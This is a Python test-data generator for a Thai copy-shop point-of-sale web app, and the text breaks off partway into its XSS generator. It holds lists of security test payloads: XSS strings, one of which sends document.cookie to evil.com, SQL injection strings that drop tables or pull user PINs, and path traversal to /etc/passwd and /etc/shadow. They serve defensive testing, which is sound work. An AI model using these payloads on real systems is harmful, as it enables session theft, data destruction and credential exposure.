#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
  PJ Copy Shop — Comprehensive Test Data Generator
  Version : 1.0
  Author  : Senior QA Engineer / Data Engineer (AI-assisted)
  Target  : Flask + SQLite POS Application (xerox.db)
=============================================================================

COVERAGE (1,000+ events across 5 test dimensions):
  1. Happy Path        – valid, realistic, business-correct data
  2. Negative/Invalid  – missing fields, wrong types, bad formats
  3. Boundary/Edge     – max/min lengths, overflow, impossible dates
  4. Security/Malicious– XSS, SQL Injection, path traversal payloads
  5. State/Workflow     – multi-step business flows (create→update→complete)

OUTPUT:
  test_data_events.json  — all raw events (for API / unit tests)
  test_data_db.json      — structured by table (for DB seeding)
  test_data_events.csv   — flat CSV for spreadsheet / analytics review

USAGE:
  pip install faker
  python test_data_generator.py
"""

import json
import csv
import random
import datetime
import uuid
import os

try:
    from faker import Faker
    fake = Faker("th_TH")
    fake_en = Faker("en_US")
except ImportError:
    print("⚠️  Faker not found. Install it: pip install faker")
    print("   Falling back to basic random data generation...")
    class _FakeTH:
        def first_name(self): return random.choice(["สมใจ","มาลี","วิชัย","อานนท์","สุดา","นิดา","ประสิทธิ์"])
        def name(self): return random.choice(["นางสาวสมใจ ใจดี","นายวิชัย เก่งกาจ","คุณมาลี สวยงาม","นายอานนท์ ชาญชัย"])
        def word(self): return random.choice(["ดินสอ","ปากกา","กระดาษ","แฟ้ม","สมุด","ยางลบ","ไม้บรรทัด"])
        def company(self): return random.choice(["บริษัท ABC จำกัด","ร้านค้าส่ง XYZ","ตลาดสด","ร้านสหกรณ์"])
    class _FakeEN:
        def bothify(self, s): return s.replace("#", str(random.randint(0,9))).replace("?", random.choice("ABCDEFG"))
    fake = _FakeTH()
    fake_en = _FakeEN()

OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))

# ─────────────────────────────────────────────
# DOMAIN CONSTANTS (from app.py analysis)
# ─────────────────────────────────────────────
PRODUCT_TYPES = [
    "Service", "Stationery", "Gift shop", "Dolls",
    "Toys", "Perfume", "IT equipment", "Brewed Drink",
    "Water", "Soft drinks", "Retail"
]
PAYMENT_METHODS = ["Cash", "PromptPay", "Split", "Credit Card"]
PAYMENT_STATUSES = ["Paid", "Unpaid", "Hold", "ยกเลิกบิล", "เคลียร์แล้ว", "ชำระบิลค้างชำระ"]
JOB_STATUSES = ["รอสินค้า", "กำลังผลิต", "รอรับสินค้า", "ส่งมอบแล้ว", "ยกเลิก"]
EXPENSE_TYPES = ["OPEX", "CAPEX", "Owner Draw"]
USER_ROLES = ["Admin", "Cashier", "Manager"]
WRITEOFF_REASONS = ["ชำรุด", "สูญหาย", "หมดอายุ", "ตกแตก", "อื่นๆ"]
THAI_BRANDS = ["Canon", "Epson", "HP", "Faber-Castell", "Pilot", "ไทยนิยม", "ตราช้าง", "Navigator", "Staedtler"]
SUPPLIERS = ["ร้านค้าส่งกรุงเทพ", "บริษัท ABC จำกัด", "ตลาดสด", "ร้านสหกรณ์", "Online Store", "โชห่วยย่าน"]

# ─────────────────────────────────────────────
# SECURITY PAYLOADS
# ─────────────────────────────────────────────
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert('xss')",
    "<svg onload=alert(1)>",
    "'\"><script>document.cookie</script>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<body onload=alert('test1')>",
    "{{7*7}}",
    "${7*7}",
    "<%=7*7%>",
    "<script>fetch('https://evil.com?c='+document.cookie)</script>",
    "<details open ontoggle=alert(1)>",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "<a href='javascript:void(0)' onclick='alert(1)'>Click</a>",
]
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE Users; --",
    "1' UNION SELECT * FROM Users--",
    "' OR 1=1--",
    "admin'--",
    "' OR 'x'='x",
    "1; SELECT * FROM sqlite_master--",
    "' AND 1=0 UNION SELECT username, pin FROM Users--",
    "' OR EXISTS(SELECT * FROM Users)--",
    "Robert'); DROP TABLE Students;--",
    "1 OR 1=1",
    "' OR ''='",
    "105 OR 1=1",
    "' WAITFOR DELAY '0:0:5'--",
]
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "%2e%2e%2f%2e%2e%2f",
    "....//....//etc/passwd",
    "/etc/shadow",
    "file:///etc/passwd",
]
SPECIAL_CHARS = [
    "\x00NULL",
    "\n\rCRLF",
    "😀🔥💯",
    "\u202eRTL",
    "\\backslash",
    "\"'`quotes",
    "<>&ampersand",
]

# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────
def rand_date(start_days_ago=365, end_days_ago=0):
    start = datetime.datetime.now() - datetime.timedelta(days=start_days_ago)
    end = datetime.datetime.now() - datetime.timedelta(days=end_days_ago)
    delta = end - start
    random_seconds = random.randint(0, max(1, int(delta.total_seconds())))
    return (start + datetime.timedelta(seconds=random_seconds)).strftime("%Y-%m-%d %H:%M:%S")

def make_event(dimension, entity, action, payload, expected_status, notes=""):
    return {
        "event_id": str(uuid.uuid4()),
        "dimension": dimension,
        "entity": entity,
        "action": action,
        "payload": payload,
        "expected_http_status": expected_status,
        "notes": notes,
        "generated_at": datetime.datetime.now().isoformat(),
    }

def rand_items(n=None, product_pool=range(1, 21)):
    n = n or random.randint(1, 4)
    types = random.choices(PRODUCT_TYPES, k=n)
    return [
        {"id": random.choice(product_pool), "qty": random.randint(1, 5),
         "price": round(random.uniform(5, 500), 2), "type": t, "name": fake.word()}
        for t in types
    ]

# ─────────────────────────────────────────────
# DIMENSION 1 — HAPPY PATH
# ─────────────────────────────────────────────
def gen_happy_path_users(n=20):
    events = []
    for _ in range(n):
        events.append(make_event(
            "happy_path", "Users", "POST /api/users",
            {"username": fake.first_name(), "role": random.choice(USER_ROLES),
             "pin": str(random.randint(1000, 9999))},
            201, "Valid user creation"
        ))
    return events

def gen_happy_path_products(n=80):
    events = []
    for _ in range(n):
        ptype = random.choice(PRODUCT_TYPES)
        cost = round(random.uniform(5, 500), 2)
        price = round(cost * random.uniform(1.1, 2.5), 2)
        events.append(make_event(
            "happy_path", "Products_Services", "POST /api/products",
            {"name": fake.word() + " " + random.choice(["A4", "สีน้ำเงิน", "ขนาด M", "แพ็ค 12", ""]),
             "type": ptype, "barcode": str(random.randint(10000000, 99999999)),
             "brand": random.choice(THAI_BRANDS), "model": fake_en.bothify("Model-###-??"),
             "color": random.choice(["ขาว", "ดำ", "น้ำเงิน", "แดง", "เขียว", ""]),
             "price": price, "cost": cost,
             "stock_qty": random.randint(0, 500), "reorder_level": random.randint(1, 20)},
            201, f"Valid product type={ptype}"
        ))
    for i in range(10):
        events.append(make_event("happy_path", "Products_Services", f"PUT /api/products/{i+1}",
                                 {"name": fake.word(), "price": round(random.uniform(10, 1000), 2),
                                  "cost": round(random.uniform(5, 500), 2), "type": random.choice(PRODUCT_TYPES),
                                  "barcode": str(random.randint(10000000, 99999999)),
                                  "stock_qty": random.randint(0, 200), "reorder_level": 5},
                                 200, "Valid product update"))
    for i in range(10):
        events.append(make_event("happy_path", "Products_Services", f"PUT /api/products/{i+1}/stock",
                                 {"add_qty": random.randint(1, 100)}, 200, "Valid stock addition"))
    return events

def gen_happy_path_customers(n=60):
    events = []
    for _ in range(n):
        phone = f"0{random.randint(6,9)}{random.randint(10000000, 99999999)}"
        events.append(make_event("happy_path", "Customers", "POST /api/customers",
                                 {"name": fake.name(), "phone": phone}, 201, "Valid customer"))
    for i in range(20):
        action = random.choice(["add", "redeem"])
        events.append(make_event("happy_path", "Customers", f"PUT /api/customers/{i+1}/points",
                                 {"action": action, "points": random.choice([10, 20, 30, 50, 100])},
                                 200, f"Valid points {action}"))
    return events

def gen_happy_path_sales(n=90):
    events = []
    configs = [
        {"payment_method": "Cash", "payment_status": "Paid", "split_cash": 0, "split_transfer": 0},
        {"payment_method": "PromptPay", "payment_status": "Paid", "split_cash": 0, "split_transfer": 0},
        {"payment_method": "Split", "payment_status": "Paid", "split_cash": 150, "split_transfer": 100},
        {"payment_method": "Cash", "payment_status": "Unpaid", "split_cash": 0, "split_transfer": 0},
        {"payment_method": "PromptPay", "payment_status": "Hold", "split_cash": 0, "split_transfer": 0},
        {"payment_method": "Credit Card", "payment_status": "Paid", "split_cash": 0, "split_transfer": 0},
    ]
    for i in range(n):
        cfg = random.choice(configs)
        events.append(make_event("happy_path", "Sales", "POST /api/sales",
                                 {"items": rand_items(),
                                  "discount": round(random.uniform(0, 50), 2),
                                  "notes": random.choice(["", "ลูกค้าประจำ", "ส่วนลดพิเศษ"]),
                                  "customer_id": random.choice([None, 1, 2, 3, 4, 5]),
                                  "redeemed_points": 0, **cfg},
                                 201, f"Sale method={cfg['payment_method']} status={cfg['payment_status']}"))
    for i in range(10):
        events.append(make_event("happy_path", "Sales", "POST /api/sales (with loyalty points)",
                                 {"items": [{"id": 1, "qty": 1, "price": 50, "type": "Brewed Drink", "name": "ชา"}],
                                  "discount": 0, "payment_method": "Cash", "payment_status": "Paid",
                                  "customer_id": (i % 5) + 1, "redeemed_points": random.choice([10, 20, 30])},
                                 201, "Valid sale with points redemption (multiple of 10)"))
    return events

def gen_happy_path_purchases(n=30):
    events = []
    for _ in range(n):
        items = [{"id": random.randint(1, 20), "qty": random.randint(1, 50),
                  "cost": round(random.uniform(5, 300), 2)} for _ in range(random.randint(1, 4))]
        events.append(make_event("happy_path", "Purchases", "POST /api/purchases",
                                 {"supplier_name": random.choice(SUPPLIERS),
                                  "has_vat": random.choice([True, False]),
                                  "payment_method": random.choice(["Cash", "PromptPay"]),
                                  "items": items},
                                 201, "Valid purchase order"))
    return events

def gen_happy_path_jobs(n=30):
    events = []
    job_details = ["พิมพ์เอกสาร A4", "เย็บเล่ม", "เคลือบบัตร", "ถ่ายเอกสาร 2 หน้า", "พิมพ์สติ๊กเกอร์", "ตัดกระดาษ"]
    for _ in range(n):
        events.append(make_event("happy_path", "Job_Orders", "POST /api/jobs",
                                 {"customer_name": fake.name(), "details": random.choice(job_details),
                                  "qty": random.randint(1, 100), "deposit": round(random.uniform(0, 500), 2),
                                  "status": "รอสินค้า"},
                                 201, "Valid job order"))
    return events

def gen_happy_path_expenses(n=30):
    events = []
    descriptions = ["ค่าน้ำ", "ค่าไฟ", "ค่าเช่า", "ค่าซ่อมเครื่อง", "ค่าแก๊ส", "ค่าโทรศัพท์",
                    "ซื้อกระดาษ A4", "ซื้อหมึกพิมพ์", "ค่าขนส่ง", "ค่าทำความสะอาด"]
    for _ in range(n):
        events.append(make_event("happy_path", "Expenses", "POST /api/expenses",
                                 {"description": random.choice(descriptions),
                                  "amount": round(random.uniform(100, 5000), 2),
                                  "expense_type": random.choice(EXPENSE_TYPES),
                                  "payment_method": random.choice(["Cash", "PromptPay"])},
                                 201, "Valid expense"))
    return events

def gen_happy_path_writeoffs(n=20):
    events = []
    for _ in range(n):
        events.append(make_event("happy_path", "Stock_WriteOffs", "POST /api/inventory/writeoff",
                                 {"product_id": random.randint(1, 20),
                                  "qty": random.randint(1, 10),
                                  "reason": random.choice(WRITEOFF_REASONS)},
                                 200, "Valid write-off"))
    return events

# ─────────────────────────────────────────────
# DIMENSION 2 — NEGATIVE / INVALID DATA
# ─────────────────────────────────────────────
def gen_negative_users(n=20):
    cases = [
        ({"username": "", "role": "Admin", "pin": "1234"}, 400, "Empty username"),
        ({"username": "Admin", "role": "", "pin": "1234"}, 400, "Empty role"),
        ({"username": "Admin", "role": "Admin", "pin": ""}, 400, "Empty PIN"),
        ({"username": None, "role": "Admin", "pin": "1234"}, 400, "Null username"),
        ({"username": "Admin", "role": "SuperAdmin", "pin": "1234"}, 400, "Invalid role"),
        ({"username": "A" * 300, "role": "Admin", "pin": "1234"}, 400, "Username > 300 chars"),
        ({}, 400, "Empty payload"),
        ({"pin": "1234"}, 400, "Missing username and role"),
        ({"username": 12345, "role": "Admin", "pin": "1234"}, 400, "Numeric username"),
        ({"username": "Admin", "role": "Admin", "pin": "abcd"}, 400, "Non-numeric PIN"),
        ({"username": "Admin", "role": "Admin", "pin": "123"}, 400, "PIN too short (3 digits)"),
        ({"username": "Admin", "role": "Admin", "pin": "12345"}, 400, "PIN too long (5 digits)"),
        ({"username": "Admin", "role": "Admin", "pin": -1234}, 400, "Negative PIN"),
        ({"username": "Admin", "role": "Cashier", "pin": None}, 400, "Null PIN"),
        ({"username": "   ", "role": "Admin", "pin": "1234"}, 400, "Whitespace-only username"),
    ]
    return [make_event("negative", "Users", "POST /api/users", p, s, n)
            for p, s, n in cases[:n]]

def gen_negative_products(n=40):
    cases = [
        ({"name": "", "type": "Stationery", "price": 10, "cost": 5}, 400, "Empty name"),
        ({"name": "ดินสอ", "type": "", "price": 10, "cost": 5}, 400, "Empty type"),
        ({"name": "ดินสอ", "type": "Stationery", "price": -50, "cost": 5}, 400, "Negative price"),
        ({"name": "ดินสอ", "type": "Stationery", "price": 10, "cost": -5}, 400, "Negative cost"),
        ({"name": "ดินสอ", "type": "Stationery", "price": "แพง", "cost": 5}, 400, "String price"),
        ({"name": "ดินสอ", "type": "Stationery", "price": 10, "cost": "ถูก"}, 400, "String cost"),
        ({"name": None, "type": "Stationery", "price": 10, "cost": 5}, 400, "Null name"),
        ({"type": "Stationery", "price": 10, "cost": 5}, 400, "Missing name key"),
        ({"name": "ดินสอ", "price": 10, "cost": 5}, 400, "Missing type key"),
        ({"name": "ดินสอ", "type": "UnknownType", "price": 10, "cost": 5}, 400, "Unknown product type"),
        ({"name": "ดินสอ", "type": "Stationery", "price": 10, "cost": 15}, 400, "Cost > price (margin violation)"),
        ({"name": "ดินสอ", "type": "Stationery", "price": 9999999.99, "cost": 9999998}, 201, "Extreme high price (edge of valid)"),
        ({"name": "ดินสอ", "type": "Stationery", "price": 10, "cost": 5, "stock_qty": -100}, 400, "Negative stock_qty"),
        ({}, 400, "Empty payload"),
        ({"name": "X" * 1001, "type": "Stationery", "price": 10, "cost": 5}, 400, "Name > 1000 chars"),
        ({"name": "ดินสอ", "type": "Stationery", "price": 10, "cost": 5, "reorder_level": -1}, 400, "Negative reorder_level"),
        ({"name": "ดินสอ", "type": "Stationery", "price": "abc", "cost": "xyz"}, 400, "Both price/cost are strings"),
        ({"name": "ดินสอ", "type": "Stationery", "price": None, "cost": 5}, 400, "Null price"),
        ({"name": "ดินสอ", "type": "Stationery", "price": 10, "cost": None}, 400, "Null cost"),
        ({"name": "ดินสอ", "type": None, "price": 10, "cost": 5}, 400, "Null type"),
    ]
    events = [make_event("negative", "Products_Services", "POST /api/products", p, s, n)
              for p, s, n in cases[:n-10]]
    for i in range(10):
        bad_qty = random.choice([-1, 0, "abc", None])
        events.append(make_event("negative", "Products_Services", "PUT /api/products/1/stock",
                                 {"add_qty": bad_qty}, 400, f"Invalid add_qty={bad_qty}"))
    return events[:n]

def gen_negative_sales(n=40):
    base_item = {"id": 1, "qty": 1, "price": 50, "type": "Retail", "name": "สินค้า"}
    cases = [
        ({"items": [], "payment_method": "Cash", "payment_status": "Paid"}, 400, "Empty items array"),
        ({"items": None, "payment_method": "Cash", "payment_status": "Paid"}, 400, "Null items"),
        ({"items": [{"id": 1, "qty": -5, "price": 50, "type": "Retail"}], "payment_method": "Cash", "payment_status": "Paid"}, 400, "Negative qty in item"),
        ({"items": [{"id": 1, "qty": 1, "price": -50, "type": "Retail"}], "payment_method": "Cash", "payment_status": "Paid"}, 400, "Negative price in item"),
        ({"items": [{"id": 99999, "qty": 1, "price": 50, "type": "Retail"}], "payment_method": "Cash", "payment_status": "Paid"}, 400, "Non-existent product_id"),
        ({"items": [base_item], "payment_method": "BitCoin", "payment_status": "Paid"}, 400, "Invalid payment_method"),
        ({"items": [base_item], "payment_method": "Cash", "payment_status": "APPROVED"}, 400, "Invalid payment_status"),
        ({"items": [base_item], "payment_method": "Cash", "payment_status": "Paid", "discount": -100}, 400, "Negative discount"),
        ({"items": [base_item], "payment_method": "Cash", "payment_status": "Paid", "redeemed_points": 7}, 400, "Points not multiple of 10"),
        ({"items": [base_item], "payment_method": "Cash", "payment_status": "Paid", "redeemed_points": 10}, 400, "Redeem points without customer_id"),
        ({"items": [{"id": 1, "qty": 99999, "price": 50, "type": "Retail"}], "payment_method": "Cash", "payment_status": "Paid"}, 400, "Qty exceeds stock"),
        ({}, 400, "Empty payload"),
        ({"items": [{"qty": 1, "price": 50, "type": "Retail"}], "payment_method": "Cash", "payment_status": "Paid"}, 400, "Item missing id"),
        ({"items": [{"id": 1, "price": 50, "type": "Retail"}], "payment_method": "Cash", "payment_status": "Paid"}, 400, "Item missing qty"),
        ({"items": [{"id": 0, "qty": 1, "price": 50, "type": "Retail"}], "payment_method": "Cash", "payment_status": "Paid"}, 400, "Item id = 0"),
        ({"items": [base_item], "payment_method": "Split", "payment_status": "Paid", "split_cash": -50, "split_transfer": 100}, 400, "Negative split_cash"),
        ({"items": [base_item], "payment_method": "Cash", "payment_status": "Paid", "customer_id": "abc"}, 400, "Non-numeric customer_id"),
        ({"items": [base_item], "payment_method": "Cash", "payment_status": "Paid", "discount": "many"}, 400, "String discount"),
        ({"items": "not-a-list", "payment_method": "Cash", "payment_status": "Paid"}, 400, "Items not a list"),
        ({"items": [base_item], "payment_method": None, "payment_status": "Paid"}, 400, "Null payment_method"),
    ]
    events = [make_event("negative", "Sales", "POST /api/sales", p, s, n)
              for p, s, n in cases[:n-10]]
    for i in range(10):
        events.append(make_event("negative", "Sales", f"POST /api/sales/{i+1}/void (re-void already voided)",
                                 {}, 400, "Void already-voided sale"))
    return events[:n]

def gen_negative_customers(n=20):
    cases = [
        ({"name": "", "phone": "0812345678"}, 400, "Empty name"),
        ({"name": None, "phone": "0812345678"}, 400, "Null name"),
        ({}, 400, "Empty payload"),
        ({"name": "คุณใจดี", "phone": "08-ABCD-EFGH"}, 400, "Phone with letters"),
        ({"name": "คุณใจดี", "phone": "123"}, 400, "Phone too short"),
        ({"name": "คุณใจดี", "phone": "0812345678901234567890"}, 400, "Phone too long"),
        ({"name": "A" * 300, "phone": "0812345678"}, 400, "Name > 300 chars"),
        ({"action": "invalid_action", "points": 100}, 400, "Invalid points action"),
        ({"action": "add", "points": -50}, 400, "Add negative points"),
        ({"action": "redeem", "points": 0}, 400, "Redeem zero points"),
        ({"action": "add", "points": None}, 400, "Null points value"),
        ({"action": None, "points": 50}, 400, "Null action"),
    ]
    return [make_event("negative", "Customers",
                       "POST /api/customers" if i < 7 else "PUT /api/customers/1/points",
                       p, s, n) for i, (p, s, n) in enumerate(cases[:n])]

def gen_negative_jobs(n=20):
    cases = [
        ({"customer_name": "", "details": "พิมพ์เอกสาร", "qty": 1, "deposit": 0}, 400, "Empty customer_name"),
        ({"customer_name": None, "details": "พิมพ์เอกสาร", "qty": 1, "deposit": 0}, 400, "Null customer_name"),
        ({"customer_name": "ลูกค้า", "details": "", "qty": 1, "deposit": 0}, 400, "Empty details"),
        ({"customer_name": "ลูกค้า", "details": "พิมพ์", "qty": -1, "deposit": 0}, 400, "Negative qty"),
        ({"customer_name": "ลูกค้า", "details": "พิมพ์", "qty": 0, "deposit": 0}, 400, "Zero qty"),
        ({"customer_name": "ลูกค้า", "details": "พิมพ์", "qty": 1, "deposit": -100}, 400, "Negative deposit"),
        ({"customer_name": "ลูกค้า", "details": "พิมพ์", "qty": 1, "deposit": 0, "status": "สถานะผิด"}, 400, "Invalid status"),
        ({}, 400, "Empty payload"),
        ({"customer_name": "ลูกค้า"}, 400, "Missing details and qty"),
        ({"customer_name": "ลูกค้า", "details": None, "qty": 1, "deposit": 0}, 400, "Null details"),
        ({"customer_name": "ลูกค้า", "details": "พิมพ์", "qty": "สิบ", "deposit": 0}, 400, "String qty"),
        ({"customer_name": "ลูกค้า", "details": "พิมพ์", "qty": 1, "deposit": "มาก"}, 400, "String deposit"),
    ]
    return [make_event("negative", "Job_Orders", "POST /api/jobs", p, s, n)
            for p, s, n in cases[:n]]

def gen_negative_expenses(n=20):
    cases = [
        ({"description": "", "amount": 100, "expense_type": "OPEX"}, 400, "Empty description"),
        ({"description": None, "amount": 100, "expense_type": "OPEX"}, 400, "Null description"),
        ({"description": "ค่าน้ำ", "amount": -100, "expense_type": "OPEX"}, 400, "Negative amount"),
        ({"description": "ค่าน้ำ", "amount": 0, "expense_type": "OPEX"}, 400, "Zero amount"),
        ({"description": "ค่าน้ำ", "amount": "มาก", "expense_type": "OPEX"}, 400, "String amount"),
        ({"description": "ค่าน้ำ", "amount": 100, "expense_type": "ไม่รู้จัก"}, 400, "Unknown expense_type"),
        ({}, 400, "Empty payload"),
        ({"amount": 100, "expense_type": "OPEX"}, 400, "Missing description"),
        ({"description": "ค่าน้ำ", "expense_type": "OPEX"}, 400, "Missing amount"),
        ({"description": "ค่าน้ำ", "amount": None, "expense_type": "OPEX"}, 400, "Null amount"),
        ({"description": "ค่าน้ำ", "amount": 100, "expense_type": None}, 400, "Null expense_type"),
        ({"description": "ค่าน้ำ", "amount": 100, "payment_method": "InvalidMethod"}, 400, "Invalid payment_method for expense"),
    ]
    return [make_event("negative", "Expenses", "POST /api/expenses", p, s, n)
            for p, s, n in cases[:n]]

# ─────────────────────────────────────────────
# DIMENSION 3 — BOUNDARY & EDGE CASES
# ─────────────────────────────────────────────
def gen_boundary_products(n=40):
    cases = [
        ({"name": "X", "type": "Retail", "price": 0.01, "cost": 0.00}, 201, "Min price 0.01"),
        ({"name": "X", "type": "Retail", "price": 0.01, "cost": 0.00}, 201, "Min cost 0.00"),
        ({"name": "X", "type": "Retail", "price": 1, "cost": 1, "stock_qty": 0}, 201, "Zero stock"),
        ({"name": "X", "type": "Retail", "price": 1, "cost": 1, "reorder_level": 0}, 201, "Zero reorder level"),
        ({"name": "X" * 255, "type": "Retail", "price": 10, "cost": 5}, 201, "Name = 255 chars (max)"),
        ({"name": "X" * 256, "type": "Retail", "price": 10, "cost": 5}, 400, "Name = 256 chars (over max)"),
        ({"name": "ดินสอ", "type": "Retail", "price": 999999.99, "cost": 1}, 201, "Max realistic price"),
        ({"name": "ดินสอ", "type": "Retail", "price": 1, "cost": 1, "stock_qty": 999999}, 201, "Max stock qty"),
        ({"name": "ดินสอ", "type": "Retail", "price": 10, "cost": 5, "barcode": "00000001"}, 201, "Min barcode value"),
        ({"name": "ดินสอ", "type": "Retail", "price": 10, "cost": 5, "barcode": "99999999"}, 201, "Max 8-digit barcode"),
        ({"name": "ดินสอ", "type": "Retail", "price": 10, "cost": 5, "barcode": ""}, 201, "Empty barcode (auto-gen)"),
        ({"name": "ดินสอ", "type": "Retail", "price": 10, "cost": 5, "barcode": "1234567890123"}, 201, "EAN-13 barcode"),
        ({"name": "ดินสอ", "type": "Retail", "price": 99.999, "cost": 50.001}, 201, "3 decimal price/cost"),
        ({"name": "ดินสอ", "type": "Retail", "price": 100.0, "cost": 100.0}, 201, "Price == cost (zero margin)"),
        ({"name": "ดินสอ", "type": "Retail", "price": 10, "cost": 5, "stock_qty": 1}, 201, "Stock exactly at reorder default (5-1=4 below)"),
        ({"name": "ดินสอ", "type": "Retail", "price": 10, "cost": 5, "reorder_level": 999999}, 201, "Extreme reorder level"),
        ({"name": " ", "type": "Retail", "price": 10, "cost": 5}, 400, "Whitespace-only name"),
        ({"name": "ดินสอ", "type": "Brewed Drink", "price": 10, "cost": 5, "stock_qty": 0}, 201, "Brewed drink with zero stock (raw material via BOM)"),
        ({"name": "ดินสอ", "type": "Service", "price": 0, "cost": 0}, 201, "Service with zero price and cost"),
        ({"name": "ดินสอ", "type": "Stationery", "price": 10, "cost": 5, "brand": "B" * 255}, 201, "Brand at 255 chars"),
    ]
    return [make_event("boundary", "Products_Services", "POST /api/products", p, s, n)
            for p, s, n in cases[:n]]

def gen_boundary_sales(n=40):
    base = {"id": 1, "qty": 1, "price": 50, "type": "Retail", "name": "สินค้าทดสอบ"}
    cases = [
        ({"items": [base], "discount": 0, "payment_method": "Cash", "payment_status": "Paid"}, 201, "Zero discount"),
        ({"items": [base], "discount": 50, "payment_method": "Cash", "payment_status": "Paid"}, 201, "Discount = total (net=0)"),
        ({"items": [base], "discount": 51, "payment_method": "Cash", "payment_status": "Paid"}, 201, "Discount > total (net clamp to 0)"),
        ({"items": [base], "discount": 0.01, "payment_method": "Cash", "payment_status": "Paid"}, 201, "Min non-zero discount"),
        ({"items": [base], "payment_method": "Cash", "payment_status": "Paid", "customer_id": 1, "redeemed_points": 0}, 201, "Redeem 0 points"),
        ({"items": [base], "payment_method": "Cash", "payment_status": "Paid", "customer_id": 1, "redeemed_points": 10}, 201, "Min redeemable (10 pts)"),
        ({"items": [base], "payment_method": "Cash", "payment_status": "Paid", "customer_id": 1, "redeemed_points": 1000}, 201, "Large redemption"),
        ({"items": [base] * 1, "payment_method": "Cash", "payment_status": "Paid"}, 201, "Single item"),
        ({"items": [base] * 50, "payment_method": "Cash", "payment_status": "Paid"}, 201, "50 items in one sale"),
        ({"items": [base], "payment_method": "Split", "payment_status": "Paid", "split_cash": 50, "split_transfer": 0}, 201, "Split: all cash"),
        ({"items": [base], "payment_method": "Split", "payment_status": "Paid", "split_cash": 0, "split_transfer": 50}, 201, "Split: all transfer"),
        ({"items": [base], "payment_method": "Split", "payment_status": "Paid", "split_cash": 25, "split_transfer": 25}, 201, "Split: equal"),
        ({"items": [base], "payment_method": "Cash", "payment_status": "Paid", "notes": "N" * 1000}, 201, "Very long notes"),
        ({"items": [base], "payment_method": "Cash", "payment_status": "Paid", "notes": ""}, 201, "Empty notes"),
        ({"items": [{"id": 1, "qty": 1, "price": 0, "type": "Service"}], "payment_method": "Cash", "payment_status": "Paid"}, 201, "Service at zero price"),
    ]
    events = [make_event("boundary", "Sales", "POST /api/sales", p, s, n) for p, s, n in cases[:n-7]]
    date_cases = [
        ("2000-01-01", "2000-01-01", "Very old date range"),
        ("2099-12-31", "2099-12-31", "Far future date range"),
        ("2025-02-29", "2025-03-01", "Non-existent Feb 29 (non-leap 2025)"),
        ("2026-01-01", "2025-12-31", "start_date after end_date"),
        ("invalid-date", "2026-01-01", "Invalid start_date format"),
        ("2026-01-01", "not-a-date", "Invalid end_date format"),
        ("", "", "Empty dates (returns all data)"),
    ]
    for start, end, note in date_cases:
        events.append(make_event("boundary", "Reports", "GET /api/reports",
                                 {"start_date": start, "end_date": end}, 200, note))
    return events[:n]

def gen_boundary_customers(n=20):
    cases = [
        ({"name": "A", "phone": "0"}, 201, "Min name 1 char"),
        ({"name": "A" * 100, "phone": "0812345678"}, 201, "Name 100 chars"),
        ({"name": "คุณ", "phone": "0000000000"}, 201, "All-zero phone"),
        ({"name": "คุณ", "phone": "9999999999"}, 201, "All-nine phone"),
        ({"name": "คุณ", "phone": "+66812345678"}, 201, "International format"),
        ({"action": "add", "points": 1}, 201, "Add 1 point (minimum)"),
        ({"action": "add", "points": 999999}, 201, "Add very large points"),
        ({"action": "redeem", "points": 10}, 201, "Redeem exactly 10 points"),
        ({"action": "redeem", "points": 999999}, 400, "Redeem more than balance"),
    ]
    return [make_event("boundary", "Customers",
                       "POST /api/customers" if i < 5 else "PUT /api/customers/1/points",
                       p, s, n) for i, (p, s, n) in enumerate(cases[:n])]

def gen_boundary_jobs(n=20):
    cases = [
        ({"customer_name": "A", "details": "x", "qty": 1, "deposit": 0.0}, 201, "Min char name + details"),
        ({"customer_name": "A" * 255, "details": "x", "qty": 1, "deposit": 0.0}, 201, "Max customer_name 255"),
        ({"customer_name": "ลูกค้า", "details": "x" * 1000, "qty": 1, "deposit": 0.0}, 201, "Very long details"),
        ({"customer_name": "ลูกค้า", "details": "x", "qty": 1, "deposit": 0.01}, 201, "Min deposit 0.01"),
        ({"customer_name": "ลูกค้า", "details": "x", "qty": 1, "deposit": 99999.99}, 201, "Large deposit"),
        ({"customer_name": "ลูกค้า", "details": "x", "qty": 99999, "deposit": 0}, 201, "Very large qty"),
        ({"customer_name": "ลูกค้า", "details": "x", "qty": 1, "deposit": 0, "status": "รอสินค้า"}, 201, "First valid status"),
        ({"customer_name": "ลูกค้า", "details": "x", "qty": 1, "deposit": 0, "status": "ยกเลิก"}, 201, "Create as already-cancelled"),
    ]
    return [make_event("boundary", "Job_Orders", "POST /api/jobs", p, s, n)
            for p, s, n in cases[:n]]

def gen_boundary_stock_count(n=20):
    cases = [
        ({"notes": "", "items": [{"product_id": 1, "system_qty": 10, "counted_qty": 10, "variance": 0}]}, 201, "Perfect count, zero variance"),
        ({"notes": "", "items": [{"product_id": 1, "system_qty": 10, "counted_qty": 0, "variance": -10}]}, 201, "Count to zero"),
        ({"notes": "", "items": [{"product_id": 1, "system_qty": 0, "counted_qty": 100, "variance": 100}]}, 201, "Found more than system"),
        ({"notes": "", "items": [{"product_id": 1, "system_qty": 10, "counted_qty": -1, "variance": -11}]}, 400, "Negative counted_qty"),
        ({"notes": "", "items": []}, 400, "Empty items"),
        ({"notes": "X" * 5000, "items": [{"product_id": 1, "system_qty": 5, "counted_qty": 5, "variance": 0}]}, 201, "Very long note"),
        ({"items": [{"product_id": 99999, "system_qty": 5, "counted_qty": 5, "variance": 0}]}, 400, "Non-existent product_id"),
        ({"notes": "test", "items": [{"product_id": 1, "system_qty": 1, "counted_qty": 1, "variance": 5}]}, 400, "Mismatched variance"),
    ]
    return [make_event("boundary", "Stock_Counts", "POST /api/stock-counts", p, s, n)
            for p, s, n in cases[:n]]

# ─────────────────────────────────────────────
# DIMENSION 4 — SECURITY / MALICIOUS
# ─────────────────────────────────────────────
def gen_security_xss(n=40):
    events = []
    targets = [
        ("Products_Services", "name", {"type": "Retail", "price": 10, "cost": 5}, "POST /api/products"),
        ("Products_Services", "brand", {"name": "Test", "type": "Retail", "price": 10, "cost": 5}, "POST /api/products"),
